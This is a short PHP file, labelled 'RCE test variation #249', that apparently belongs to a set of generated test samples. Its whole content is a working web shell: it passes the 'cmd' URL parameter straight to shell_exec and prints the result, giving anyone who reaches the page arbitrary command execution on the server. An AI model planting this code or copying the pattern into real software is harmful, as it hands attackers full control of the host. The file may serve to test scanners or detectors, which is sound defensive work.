<?php
// RCE test variation #249
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>